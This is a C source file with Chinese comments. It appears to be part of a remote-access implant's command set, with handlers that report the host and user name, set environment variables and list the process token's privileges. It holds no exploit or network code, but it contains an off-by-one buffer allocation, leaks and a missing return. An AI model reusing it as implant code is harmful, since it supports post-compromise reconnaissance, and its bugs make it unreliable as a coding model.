#include "Identity.h"
#include "Command.h"

unsigned char* CmdGetUid(size_t* msgLen) {
    unsigned char* computerName = (unsigned char*)malloc(MAX_COMPUTERNAME_LENGTH);
    unsigned char* userName = (unsigned char*)malloc(UNLEN);

    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

    if (!GetComputerNameA(computerName, &size)) {
        fprintf(stderr, "GetComputerNameA failed with error:%lu\n\n", GetLastError());
        return NULL;
    }

    size = UNLEN + 1;
    if (!GetUserNameA(userName, &size)) {
        fprintf(stderr, "GetUserNameA failed with error:%lu\n\n", GetLastError());
        return NULL;
    }

    if (computerName && userName) {
        size_t total_len = strlen(computerName) + strlen(userName) + 1;
        unsigned char* postMsg = (unsigned char*)malloc(total_len + 1);
        if (!postMsg) {
            fprintf(stderr, "Memory allocation failed\n");
            return NULL;
        }
        snprintf(postMsg, total_len + 1, "%s\\%s", computerName, userName);
        *msgLen = total_len;

        postMsg[total_len] = '\0';
        free(computerName);
        free(userName);

        return postMsg;
    }
}

// 是对当前进程的环境变量
unsigned char* CmdSetEnv(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
    // 返回 0 表示成功
    if (putenv(commandBuf)) {
        fprintf(stderr, "putenv failed\n");
        return NULL;
    }

    unsigned char* prefix = "[*] Env is ";
    unsigned char* postMsg = malloc(strlen(prefix) + commandBuflen + 1);
    if (!postMsg) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }
    snprintf(postMsg, strlen(prefix) + commandBuflen + 1, "%s%s", prefix, commandBuf);
    *msgLen = strlen(prefix) + commandBuflen;
    return postMsg;
}

unsigned char* AttrToStateStringA(DWORD attrs) {
    if (attrs & SE_PRIVILEGE_REMOVED) return "Removed";
    if (attrs & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
        if (attrs & SE_PRIVILEGE_ENABLED) return "Enabled (Default)";
        return "Disabled (Default)";
    }
    if (attrs & SE_PRIVILEGE_ENABLED) return "Enabled";
    return "Disabled";
}

unsigned char* CmdGetPrivs(size_t* msgLength) {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        fprintf(stderr, "OpenProcessToken failed: %lu\n\n", GetLastError());
        return NULL;
    }

    DWORD needed = 0;
    if (!GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &needed) &&
        GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        fprintf(stderr, "GetTokenInformation failed: %lu\n\n", GetLastError());
        CloseHandle(hToken);
        return NULL;
    }

    PTOKEN_PRIVILEGES pTP = (PTOKEN_PRIVILEGES)malloc(needed);
    if (!pTP) {
        CloseHandle(hToken);
        return NULL;
    }

    if (!GetTokenInformation(hToken, TokenPrivileges, pTP, needed, &needed)) {
        fprintf(stderr, "GetTokenInformation failed: %lu\n\n", GetLastError());
        free(pTP);
        CloseHandle(hToken);
        return NULL;
    }

    // 初始标题行
    size_t totalLen = strlen("Privilege\tDescription\tState\r\n") + 1;

    // 第一次遍历：计算总长度
    for (DWORD i = 0; i < pTP->PrivilegeCount; i++) {
        LUID luid = pTP->Privileges[i].Luid;

        char name[256]; DWORD nameLen = _countof(name);
        if (!LookupPrivilegeNameA(NULL, &luid, name, &nameLen)) {
            strcpy_s(name, sizeof(name), "(Unknown)");
        }

        char desc[512]; DWORD descLen = _countof(desc);
        DWORD dwLangId = 0;
        if (!LookupPrivilegeDisplayNameA(NULL, name, desc, &descLen, &dwLangId)) {
            strcpy_s(desc, sizeof(desc), name);
        }

        const unsigned char* state = AttrToStateStringA(pTP->Privileges[i].Attributes);

        totalLen += strlen(name) + strlen(desc) + strlen(state) + 4;
    }

    // 分配缓冲区
    unsigned char* postMsg = (unsigned char*)malloc(totalLen);
    if (!postMsg) {
        fprintf(stderr, "Memory allocation failed\n");
        free(pTP);
        CloseHandle(hToken);
        return NULL;
    }

    strcpy_s(postMsg, totalLen, "Privilege\tDescription\tState\r\n");

    // 第二次遍历：拼接字符串
    for (DWORD i = 0; i < pTP->PrivilegeCount; i++) {
        LUID luid = pTP->Privileges[i].Luid;

        char name[256]; DWORD nameLen = _countof(name);
        if (!LookupPrivilegeNameA(NULL, &luid, name, &nameLen)) {
            strcpy_s(name, sizeof(name), "(Unknown)");
        }

        char desc[512]; DWORD descLen = _countof(desc);
        DWORD dwLangId = 0;
        if (!LookupPrivilegeDisplayNameA(NULL, name, desc, &descLen, &dwLangId)) {
            strcpy_s(desc, sizeof(desc), name);
        }

        const unsigned char* state = AttrToStateStringA(pTP->Privileges[i].Attributes);

        char line[1024];
        _snprintf_s(line, sizeof(line), _TRUNCATE, "%s\t%s\t%s\r\n", name, desc, state);

        strcat_s(postMsg, totalLen, line);
    }

    free(pTP);
    CloseHandle(hToken);

    *msgLength = strlen(postMsg);
    return postMsg;
}